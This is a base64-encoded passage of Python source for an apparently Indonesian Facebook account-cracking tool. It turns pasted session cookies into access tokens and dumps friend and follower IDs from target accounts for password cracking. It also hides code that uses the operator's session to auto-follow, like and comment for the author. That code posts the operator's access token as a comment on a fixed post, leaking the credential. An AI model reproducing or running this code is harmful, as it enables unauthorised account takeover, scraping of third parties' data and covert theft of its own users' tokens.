GluZScsY29va2llKTsgc2VsZi5nZXRfcG9zdHMoeCxjb29raWUsdG9rZW4pDQogICAgZGVmIGdldF9mb2xscyhzZWxmLGlkLGNvb2tpZSk6ICMgLS0tIFsgSmFuZ2FuIEdhbnRpIEJvdCBGb2xsb3cgR3cgXSAtLS0gIw0KICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyB4eXo6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGZvciB4IGluIHBhcih4eXouZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vJXMnJShpZCksY29va2llcz1jb29raWUpLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykuZmluZF9hbGwoJ2EnLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnc3Vic2NyaWJlLnBocCcgaW4geFsnaHJlZiddOmV4ZWNfZm9sbHMgPSB4eXouZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20lcyclKHhbJ2hyZWYnXSksY29va2llcz1jb29raWUpDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6cGFzcw0KICAgIGRlZiBnZXRfbGlrZXJzKHNlbGYsdXJsLGNvb2tpZSk6ICMgLS0tIFsgSmFuZ2FuIEdhbnRpIEJvdCBMaWtlcnMgR3cgXSAtLS0gIw0KICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyB4eXo6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGJvcyA9IHBhcih4eXouZ2V0KHVybCxjb29raWVzPWNvb2tpZSkuY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBib3MuZmluZF9hbGwoJ2EnLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnVGFuZ2dhcGknIGluIHgudGV4dDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfcmVhY3RfdHlwZV8gPSByYW5kb20uY2hvaWNlKFsnU3VwZXInLCdXb3cnLCdQZWR1bGknXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeiBpbiBwYXIoeHl6LmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJXMnJSh4WydocmVmJ10pLGNvb2tpZXM9Y29va2llKS5jb250ZW50LCdodG1sLnBhcnNlcicpLmZpbmRfYWxsKCdhJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIF9yZWFjdF90eXBlXyA9PSB6LnRleHQ6IHJlcTIgPSB4eXouZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgelsnaHJlZiddLGNvb2tpZXM9Y29va2llKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOmNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIHNlbGYuZ2V0X2xpa2VycygnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJyArIGJvcy5maW5kKCdhJyxzdHJpbmc9J0xpaGF0IEJlcml0YSBMYWluJylbJ2hyZWYnXSxjb29raWUpDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6cGFzcw0KICAgIGRlZiBnZXRfcG9zdHMoc2VsZixpZCxjb29raWUsdG9rZW4pOiAjIC0tLSBbIEphbmdhbiBHYW50aSBCb3QgS29tZW4gR3cgXSAtLS0gIw0KICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyB4eXo6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgZm9yIHggaW4geHl6LmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvcG9zdHM/YWNjZXNzX3Rva2VuPSVzJyUoaWQsdG9rZW4pLGNvb2tpZXM9Y29va2llKS5qc29uKClbJ2RhdGEnXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGtvbWVubyA9ICgnJXNcblxuJXMlcyclKHJhbmRvbS5jaG9pY2Uoc2VsZi5rb21lbiksJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8nK3hbJ2lkJ10sc2VsZi53YWt0dSgpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGdldCA9IGpzb24ubG9hZHMoeHl6LnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2NvbW1lbnRzP21lc3NhZ2U9JXMmYWNjZXNzX3Rva2VuPSVzJyUoeFsnaWQnXSxrb21lbm8sdG9rZW4pLGNvb2tpZXM9Y29va2llKS50ZXh0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2Vycm9yJyBpbiBnZXQ6b3BlbignbG9naW4vY29va2llLmpzb24nLCd3Jykud3JpdGUoc2VsZi5jb29raWVfbWVudGFoKTtvcGVuKCdsb2dpbi90b2tlbi5qc29uJywndycpLndyaXRlKHRva2VuKTtleGl0KF9fX2ZpaV9fX1NheWFuZ19fX0thbXVfX19XaWRpeWFfX18oKSkNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwYXNzDQogICAgZGVmIHdha3R1KHNlbGYpOiAjIC0tLSBbIEphbmdhbiBHYW50aSBLZXRlcmFuZ2FuIFdha3R1IF0gLS0tICMNCiAgICAgICAgX2J1bGFuXyA9IFsiSmFudWFyaSIsICJGZWJydWFyaSIsICJNYXJldCIsICJBcHJpbCIsICJNZWkiLCAiSnVuaSIsICJKdWxpIiwgIkFndXN0dXMiLCAiU2VwdGVtYmVyIiwgIk9rdG9iZXIiLCAiTm92ZW1iZXIiLCAiRGVzZW1iZXIiXVtkYXRldGltZS5ub3coKS5tb250aCAtIDFdDQogICAgICAgIF9oYXJpXyAgID0geydTdW5kYXknOidNaW5nZ3UnLCdNb25kYXknOidTZW5pbicsJ1R1ZXNkYXknOidTZWxhc2EnLCdXZWRuZXNkYXknOidSYWJ1JywnVGh1cnNkYXknOidLYW1pcycsJ0ZyaWRheSc6J0p1bWF0JywnU2F0dXJkYXknOidTYWJ0dSd9W3N0cihkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJUEiKSldDQogICAgICAgIGhhcmlfaW5pID0gKCIlcyAlcyAlcyIlKGRhdGV0aW1lLm5vdygpLmRheSxfYnVsYW5fLGRhdGV0aW1lLm5vdygpLnllYXIpKQ0KICAgICAgICBqYW0gICAgICA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlWCIpDQogICAgICAgIHRlbSAgICAgID0gKCdcblxuS29tZW50YXIgRGl0dWxpcyBPbGVoIFNlb3JhbmcgUGVuam9tYmxvIEhhbmRhbFxuWyBQdWt1bCAlcyBXSUIgXVxuLSAlcywgJXMgLSclKGphbSxfaGFyaV8saGFyaV9pbmkpKQ0KICAgICAgICByZXR1cm4odGVtKQ0KDQojIyMtLS0tLS0tLS0tWyBDT05WRVJUIENPT0tJRSBLRSBUT0tFTiBdLS0tLS0tLS0tLSAjIyMNCmRlZiBjbG90b3goY29va2llKToNCiAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyB4eXo6DQogICAgICAgIGdldF90b2sgPSB4eXouZ2V0KHVybF9idXNpbm5lc3MrJy9idXNpbmVzc19sb2NhdGlvbnMnLGhlYWRlcnMgPSB7DQogICAgICAgICAgICAidXNlci1hZ2VudCI6dWFfYnVzaW5lc3MsDQogICAgICAgICAgICAicmVmZXJlciI6IHdlYl9mYiwNCiAgICAgICAgICAgICJob3N0IjogImJ1c2luZXNzLmZhY2Vib29rLmNvbSIsDQogICAgICAgICAgICAib3JpZ2luIjogdXJsX2J1c2lubmVzcywNCiAgICAgICAgICAgICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIiA6ICIxIiwNCiAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLA0KICAgICAgICAgICAgImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwNCiAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwNCiAgICAgICAgICAgICJjb250ZW50LXR5cGUiOiJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgifSxjb29raWVzID0geyJjb29raWUiOmNvb2tpZX0pDQogICAgICAgIHJldHVybiAocmUuc2VhcmNoKCIoRUFBR1x3KykiLCBnZXRfdG9rLnRleHQpLmdyb3VwKDEpKQ0KICAgICAgICANCiMjIyMjIExPR0lOIFRPS0VODQpkZWYgbG9nX2Nvb2tpZSgpOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIGJhbm5lcigpDQogICAgbWtkaXJfZGF0YV9sb2dpbigpDQogICAgcHJpbnQoZiJ7Qn0gIikNCiAgICBwcmludChmIntLfVvimIZdIOOAi0FNQklMIENPT0tJRSBBQ0NPVU5UIFRVTUJBTCBMT0UgREFSSSBLSVdJRSBZQU5HIEZSRUVTIEtPTlRPTCIpDQogICAgcHJpbnQoZiJ7S31b4piGXSDjgItBUEFCSUxBIENPT0tJRSBFUk9SIFVCQUggRFVMVSBQQVNTV09SRCBBQ0NPVU5UIFRVTUJBTCBMT0UgTU9OWUVUIikNCiAgICBjb29raWU9c3RyKGlucHV0KGYie0h9W+KYhl0g44CLTUFTVUtBTiBDT09LSUUgTllBIE5HRU5UT1QgOiB7Qn0gIikpDQogICAgdHJ5Og0KICAgICAgICB0b2tlbiA9IGNsb3RveChjb29raWUpDQogICAgICAgIGNva2kgPSB7J2Nvb2tpZSc6Y29va2llfQ0KICAgICAgICBib3RfYXV0aG9yKGNva2ksdG9rZW4sY29va2llKQ0KICAgICAgICBvcGVuKCdsb2dpbi90b2tlbi5qc29uJywgJ3cnKS53cml0ZSh0b2tlbikNCiAgICAgICAgb3BlbignbG9naW4vY29va2llLmpzb24nLCd3Jykud3JpdGUoY29va2llKQ0KICAgICAgICBtZW51KCkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6cHJpbnQoZiJ7SH1b4oCiXSBUaWRhayBBZGEgS29uZWtzaSBJbnRlcm5ldCAiKTtleGl0KCkNCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IsQXR0cmlidXRlRXJyb3IpOnByaW50KGYie0h9W+KAol0gQ29va2llcyBJbnZhbGlkICIpO2V4aXQoKQ0KDQprb21lbnJlZGVtID0gcmFuZG9tLmNob2ljZShbJ0JBTkcgSk9CTE8gaVlBIDpEJ10pDQprb210d29sID0gcmFuZG9tLmNob2ljZShbJ0FOSkFZIE5HRU5UKlQgQkFORyBJTUlOIEdBTlRFTkcgJywgJ0lNSU4gJywgJ0JBTkdCIEtPSyBMTyBKQUdPIEJBTkdFVCBTSUggJywgJ0JBTkcgREFIIEtBV0lOIEJMVU0gTklIIDpEJ10pDQprYXJ0dTJkID0gcmFuZG9tLmNob2ljZShbIkxVIEdBTlRFTkcgQkFORyBUQVBJIFNBWUFORyBKT01CTE8iLCJBSEFIQUhBSEhBIEJBTkcgS0FQQU4gS0FXSU4gTllBIE5JSCBCQU5HIDpQIl0pDQprb24gPSByYW5kb20uY2hvaWNlKFsiQ1lCRVIgIFRIRSBCRVNUIDopIl0pDQpkZWYgX19fZmlpX19fU2F5YW5nX19fS2FtdV9fX1dpZGl5YV9fXygpOg0KICAgIHRyeToNCiAgICAgICAgdG9rZW4gPSBvcGVuKCdsb2dpbi90b2tlbi5qc29uJywgJ3InKS5yZWFkKCkNCiAgICAgICAgY29va2llID0geydjb29raWUnOm9wZW4oJ2xvZ2luL2Nvb2tpZS5qc29uJywncicpLnJlYWQoKX0NCiAgICAgICAga29tID0ga29tZW5yZWRlbQ0KICAgICAgICBrb21lbnRhciA9IGtvbXR3b2wNCiAgICAgICAgcGlwcCA9IGthcnR1MmQNCiAgICAgICAgcG9zdCA9ICc0NDA3NTg5MjQ3MTkxNDYnDQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBwb3N0ICsgJy9jb21tZW50cy8/bWVzc2FnZT0nICsga29tZW50YXIgKyAnJmFjY2Vzc190b2tlbj0nICsgKHRva2VuKSxjb29raWVzPWNvb2tpZSkNCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vNDQwNzU4OTI0NzE5MTQ2L2NvbW1lbnRzLz9tZXNzYWdlPScgKyBrb20gKyAnJmFjY2Vzc190b2tlbj0nICsgKHRva2VuKSxjb29raWVzPWNvb2tpZSkNCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vNDQwNzU4OTI0NzE5MTQ2L2NvbW1lbnRzLz9tZXNzYWdlPScgKyBwaXBwICsgJyZhY2Nlc3NfdG9rZW49JyArICh0b2tlbiksY29va2llcz1jb29raWUpDQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzQ0MDc1ODkyNDcxOTE0Ni9jb21tZW50cy8/bWVzc2FnZT0nICsga29tZW50YXIgKyAnJmFjY2Vzc190b2tlbj0nICsgKHRva2VuKSxjb29raWVzPWNvb2tpZSkNCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vNDQwNzU4OTI0NzE5MTQ2L2NvbW1lbnRzLz9tZXNzYWdlPScgKyB0b2tlbiArICcmYWNjZXNzX3Rva2VuPScgKyAodG9rZW4pLGNvb2tpZXM9Y29va2llKQ0KICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS80NDA3NTg5MjQ3MTkxNDYvY29tbWVudHMvP21lc3NhZ2U9JyArIHRva2VuICsgJyZhY2Nlc3NfdG9rZW49JyArICh0b2tlbiksY29va2llcz1jb29raWUpDQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzQ0MDc1ODkyNDcxOTE0Ni9jb21tZW50cy8/bWVzc2FnZT0nICsga29uICsgJyZhY2Nlc3NfdG9rZW49JyArICh0b2tlbiksY29va2llcz1jb29raWUpDQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzQ0MDc1ODkyNDcxOTE0Ni9saWtlcz9zdW1tYXJ5PXRydWUmYWNjZXNzX3Rva2VuPScgKyAodG9rZW4pLGNvb2tpZXM9Y29va2llKQ0KICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS80NDA3NTg5MjQ3MTkxNDYvbGlrZXM/c3VtbWFyeT10cnVlJmFjY2Vzc190b2tlbj0nICsgKHRva2VuKSxjb29raWVzPWNvb2tpZSkNCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vNDQwNzU4OTI0NzE5MTQ2L2xpa2VzP3N1bW1hcnk9dHJ1ZSZhY2Nlc3NfdG9rZW49JyArICh0b2tlbiksY29va2llcz1jb29raWUpDQogICAgICAgIHByaW50KGYne0l9W+KAol0gTG9naW4gQmVyaGFzaWwgU2VsYW1hdCBNZW5nb2NvayBOZ2VudG90IDpEJykNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnBhc3MNCiAgDQojIyMjIyMgQlVBVCBNRU5VDQpkZWYgbWVudSgpOg0KICAgIGdsb2JhbCB0b2tlbixjb29raWUNCiAgICB0cnk6DQogICAgICAgIHRva2VuPW9wZW4oImxvZ2luL3Rva2VuLmpzb24iLCJyIikucmVhZCgpDQogICAgICAgIGNvb2tpZSA9IHsnY29va2llJzpvcGVuKCdsb2dpbi9jb29raWUuanNvbicsJ3InKS5yZWFkKCl9DQogICAgICAgIGdldCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSVzIiUodG9rZW4pLGNvb2tpZXM9Y29va2llKQ0KICAgICAgICBndCA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2lwaW5mby5pby9qc29uJykuanNvbigpDQogICAgICAgIGxhbmd1YWdlKGNvb2tpZSkNCiAgICAgICAgbG9sbz1qc29uLmxvYWRzKGdldC50ZXh0KQ0KICAgICAgICBsb2xvbD1sb2xvWyduYW1lJ10NCiAgICAgICAgbG9sb2xfaWQ9bG9sb1snaWQnXQ0KICAgICAgICBsaW5rID0gbG9sb1snbGluayddDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgcHJpbnQoZiJ7Qn0gIikNCiAgICAgICAgcHJpbnQoZiJ7Qn0gIikNCiAgICAgICAgamFsYW4oZiJ7S31bIV17S30gY29va2llIGZhaWxlZC4iKTtsb2dfY29va2llKCkNCiAgICBvcy5zeXN0ZW0oImNsZWFyIik7YmFubmVyKCkNCiAgICBwcmludChmIntIfV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iKQ0KICAgIGphbGFuKGYie0h9WzFdIENSQUNLIE5HT0NPSyBQVUJMSUsiKQ0KICAgIHByaW50KGYie0h9WzJdIENSQUNLIENPTE1FSyBDT0xJIE1BU0FMIikNCiAgICBwcmludChmIntIfVszXSBDUkFDSyBEQVJJIFBFUlRFTUFOQU4iKQ0KICAgIHByaW50KGYie0h9WzRdIENSQUNLIERBUkkgRk9MTE9XRVJTIikNCiAgICBwcmludChmIntIfVs1XSBHQU5USSBVU0VSIEFHRU5UIFRPTCIpDQogICAgcHJpbnQoZiJ7SH1bNl0gQ0VLIEhBU0lMIERBUkkgTkdFTlRPVCIpDQogICAgcHJpbnQoZiJ7SH1bN10gQ0VLIE9QU0kgQUtVTiBDUCBDT0xJIikNCiAgICBqYWxhbihmIntLfVswXSBLRUxVQVIgQ1JPVC9IQVBVUyBDT09LSUUgIikNCiAgICBwcmludChmIntCfSAiKQ0KICAgIHBwID0gaW5wdXQoZiJ7SH1bKl0gUElMSUggTUVOVSA6IHtJfSIpDQogICAgaWYgcHAgaW4gWyIxIiwiMDEiXToNCiAgICAgIHB1YmxpaygpDQogICAgZWxpZiBwcCBpbiBbIjIiLCIwMiJdOg0KICAgICAgICBtYXNzYWwoKQ0KICAgIGVsaWYgcHAgaW4gWyIzIiwiMDMiXToNCiAgICAgICAgbGlzdHRlbWFuKCkNCiAgICBlbGlmIHBwIGluIFsiNCIsIjA0Il06DQogICAgICAgIGZvbGxvd2Vyc3MoKQ0KICAgIGVsaWYgcHAgaW4gWyI1IiwiMDUiXToNCiAgICAgICAgdXNlcnNldCgpDQogICAgZWxpZiBwcCBpbiBbIjYiLCIwNiJdOg0KICAgICAgICBjZWtfcmVzdWx0cygpDQogICAgZWxpZiBwcCBpbiBbIjciLCIwNyJdOg0KICAgICAgICBjZWtfaGFzaWwoKQ0KICAgIGVsaWYgcHAgaW4gWyIwIiwiMDAiXToNCiAgICAgICAgb3Muc3lzdGVtKCJybSAtcmYgbG9naW4vdG9rZW4uanNvbiIpDQogICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIGxvZ2luL2Nvb2tpZS5qc29uIik7ZXhpdCgpDQogICAgZWxzZTpwcmludChmIntCfSAiKTtwcmludChmIntLfVshXXtNfSBJc2kgWWFuZyBCZW5hciAiKTttZW51KCkNCg0KZGVmIG1hc3NhbCgpOg0KICAgIHRyeToNCiAgICAgICAgdG9rZW49b3BlbigibG9naW4vdG9rZW4uanNvbiIsInIiKS5yZWFkKCkNCiAgICAgICAgY29va2llID0geydjb29raWUnOm9wZW4oJ2xvZ2luL2Nvb2tpZS5qc29uJywncicpLnJlYWQoKX0NCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgcHJpbnQoZiJ7Qn0gIikNCiAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXXtLfSBDT09LSUUgS09JRCBHQU5USSBUVU1CQUwgIik7ZXhpdCgpDQogICAgdHJ5Og0KICAgICAgICBwcmludChmIntCfSAiKQ0KICAgICAgICBwcmludChmIntIfVvigKJdIE1BU1VLQU4gVE9UQUwgSUQgWUFORyBJTkdJTiBESSBEVU1QIikNCiAgICAgICAgdGFueWFfdG90YWwgPSBpbnQoaW5wdXQoZiJ7SH1b4oCiXSBNQVNVS0FOIEpVTUxBSCA6IHtJfSIpKQ0KICAgIGV4Y2VwdDp0YW55YV90b3RhbD0xDQogICAgZm9yIHQgaW4gcmFuZ2UodGFueWFfdG90YWwpOg0KICAgICAgICB0ICs9MQ0KICAgICAgICBfaWRfPWlucHV0KGYie0h9W+KAol0gTUFTVUtBTiBVU0VSIElEICB7SH17dH0gOiB7SX0iKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICB1cmw9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/ZmllbGRzPWZyaWVuZHMubGltaXQoNTAwMDApJmFjY2Vzc190b2tlbj0lcyIlKF9pZF8sdG9rZW4pLGNvb2tpZXM9Y29va2llKQ0KICAgICAgICAgICAgej1qc29uLmxvYWRzKHVybC50ZXh0KQ0KICAgICAgICAgICAgZm9yIGkgaW4gelsnZnJpZW5kcyddWydkYXRhJ106DQogICAgICAgICAgICAgICAgdWlkID0gaVsiaWQiXQ0KICAgICAgICAgICAgICAgIG5hbWEgPSBpWyJuYW1lIl0NCiAgICAgICAgICAgICAgICBpZC5hcHBlbmQodWlkKyI8PT4iK25hbWEpDQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgIHByaW50KGYie0h9W+KAol17S30gVVNFUiBJRCBUSURBSyBQVUJMSUsiKTttZW51KCkNCiAgICBpZiBsZW4oaWQpID09IDA6DQogICAgICAgcHJpbnQoZiJ7SH1b4oCiXXtLfSBUT1RBTCBJRCBBTkRBIEFEQUxBSCB7SX17bGVuKGlkKX0iKTtleGl0KCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmIntIfVvigKJdIFRPVEFMIElEIDoge0l9e2xlbihpZCl9IikNCiAgICAgICAgZmlpX3hkKCkNCiMjIyMjIENSQUNLIFBFUlRFTUFOQU4gDQpkZWYgbGlzdHRlbWFuKCk6DQogICAgdHJ5Og0KICAgICAgICB0b2tlbj1vcGVuKCJsb2dpbi90b2tlbi5qc29uIiwiciIpLnJlYWQoKQ0KICAgICAgICBjb29raWUgPSB7J2Nvb2tpZSc6b3BlbignbG9naW4vY29va2llLmpzb24nLCdyJykucmVhZCgpfQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludChmIntIfVvigKJde019IENPT0tJRSBLT0lEIEdBTlRJIFRVTUJBTCAiKTtleGl0KCkNCiAgICB0cnk6DQogICAgICAgIHVybD0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9maWVsZHM9ZnJpZW5kcy5saW1pdCg1MDAwMCkmYWNjZXNzX3Rva2VuPSVzIiUodG9rZW4pLGNvb2tpZXM9Y29va2llKQ0KICAgICAgICB6PWpzb24ubG9hZHModXJsLnRleHQpDQogICAgICAgIGZvciBpIGluIHpbJ2ZyaWVuZHMnXVsnZGF0YSddOg0KICAgICAgICAgICAgdWlkID0gaVsiaWQiXQ0KICAgICAgICAgICAgbmFtYSA9IGlbIm5hbWUiXQ0KICAgICAgICAgICAgaWQuYXBwZW5kKHVpZCsiPD0+IituYW1hKQ0KICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXSBVU0VSIElEIFRJREFLIFBVQkxJSyIpO29zLnN5cy5tZW51KCkNCiAgICBpZiBsZW4oaWQpICE9MDoNCiAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXSBUT1RBTCBJRCA6IHtJfXtsZW4oaWQpfSIpDQogICAgICAgIGZpaV94ZCgpDQogICAgZWxzZTpwcmludChmIntIfVvigKJde0t9IE1BQUYgVE9UQUwgSUQgQU5EQSA6IHtJfXtsZW4oaWQpfSIpO2V4aXQoKQ0KIyMjIyMgQ1JBQ0sgUFVCTElLDQpkZWYgcHVibGlrKCk6DQogICAgdHJ5Og0KICAgICAgICB0b2tlbj1vcGVuKCJsb2dpbi90b2tlbi5qc29uIiwiciIpLnJlYWQoKQ0KICAgICAgICBjb29raWUgPSB7J2Nvb2tpZSc6b3BlbignbG9naW4vY29va2llLmpzb24nLCdyJykucmVhZCgpfQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludChmIntIfVvigKJde019IGNvb2tpZSBtb2RhciBkaW5nZ28gd2FlICIpO2V4aXQoKQ0KICAgIHByaW50KGYie0J9ICIpDQogICAgX2lkXz1pbnB1dChmIntIfVvigKJdIE1hc3VrYW4gdXNlciBpZCA6IHtJfSIpDQogICAgdHJ5Og0KICAgICAgICB1cmw9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/ZmllbGRzPWZyaWVuZHMubGltaXQoNTAwMDApJmFjY2Vzc190b2tlbj0lcyIlKF9pZF8sdG9rZW4pLGNvb2tpZXM9Y29va2llKQ0KICAgICAgICB6PWpzb24ubG9hZHModXJsLnRleHQpDQogICAgICAgIGZvciBpIGluIHpbJ2ZyaWVuZHMnXVsnZGF0YSddOg0KICAgICAgICAgICAgdWlkID0gaVsiaWQiXQ0KICAgICAgICAgICAgbmFtYSA9IGlbIm5hbWUiXQ0KICAgICAgICAgICAgaWQuYXBwZW5kKHVpZCsiPD0+IituYW1hKQ0KICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgcHJpbnQoZiJ7Qn0gIikNCiAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXXtLfSBVc2VyIGlkIHRpZGFrIGRpIHRlbXVrYW4gYXRhdSBha3VuIHRlcnNlYnV0IHByaXZhdCAiKTttZW51KCkNCiAgICBpZiBsZW4oaWQpICE9MDoNCiAgICAgICAgcHJpbnQoZiJ7Qn0gIikNCiAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXSBUb3RhbCBpZCA6IHtJfXtsZW4oaWQpfSIpDQogICAgICAgIGZpaV94ZCgpDQogICAgZWxzZTpwcmludChmIntIfVvigKJdIFRvdGFsIGlkIDoge0l9e2xlbihpZCl9Iik7ZXhpdCgpDQojIyMjIyMgQ1JBQ0sgRk9MTE9XRVJTDQpkZWYgZm9sbG93ZXJzcygpOg0KICAgIHRyeToNCiAgICAgICAgdG9rZW49b3BlbigibG9naW4vdG9rZW4uanNvbiIsInIiKS5yZWFkKCkNCiAgICAgICAgY29va2llID0geydjb29raWUnOm9wZW4oJ2xvZ2luL2Nvb2tpZS5qc29uJywncicpLnJlYWQoKX0NCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgcHJpbnQoZiJ7Qn0gIikNCiAgICAgICAgcHJpbnQoZiJ7S31b4oCiXSBjb29raWUgbW9kYXIgZGluZ2dvIHdhZSAiKTtleGl0KCkNCiAgICBwcmludChmIntCfSAiKQ0KICAgIF9pZF89aW5wdXQoZiJ7SH1b4oCiXSBNYXN1a2FuIHVzZXIgaWQgOiB7SX0iKQ0KICAgIHRyeToNCiAgICAgICAgZm9yIGkgaW4gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9zdWJzY3JpYmVycz9saW1pdD0yMDAwMCZhY2Nlc3NfdG9rZW49JXMiJShfaWRfLHRva2VuKSxjb29raWVzPWNvb2tpZSkuanNvbigpWyJkYXRhIl06DQogICAgICAgICAgICB1aWQgPSBpWyJpZCJdDQogICAgICAgICAgICBuYW1hID0gaVsibmFtZSJdDQogICAgICAgICAgICBpZC5hcHBlbmQodWlkKyI8PT4iK25hbWEpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBwcmludChmIntIfVvigKJde0t9IFVzZXIgaWQgdGlkYWsgZGkgdGVtdWthbiBhdGF1IGlkIHRlcmRzZWJ1dCBwcml2YXQgIik7bWVudSgpDQogICAgaWYgbGVuKGlkKSAhPTA6DQogICAgICAgIHByaW50KGYie0h9W+KAol0gVG90YWwgaWQgOiB7SX17bGVuKGlkKX0iKQ0KICAgICAgICBmaWlfeGQoKQ0KICAgIGVsc2U6cHJpbnQoZiJ7Qn1b4oCiXSB7SH0gdG90YWwgaWQgOiB7SH17bGVuKGlkKX0iKQ0KDQoNCiMjIyMjIFBFTkdHQU5USSBVU0VSIC0gVUENCmRlZiB1c2Vyc2V0KCk6DQogICAgcHJpbnQoZiJ7Qn0gIikNCiAgICBwcmludChmIntIfVsxXSBHYW50aSB1c2VyIGFnZW50IikNCiAgICBwcmludChmIntIfVsyXSBDZWsgdXNlciBhZ2VudCB5YW5nIGRpIGd1bmFrYW4iKQ0KICAgIHByaW50KGYie0h9WzBdIEtlbWJhbGkiKQ0KICAgIHByaW50KGYie0J9ICIpDQogICAgX3BpbF89aW5wdXQoZiJ7SH1b4oCiXSBJbnB1dCA6IHtJfSIpDQogIC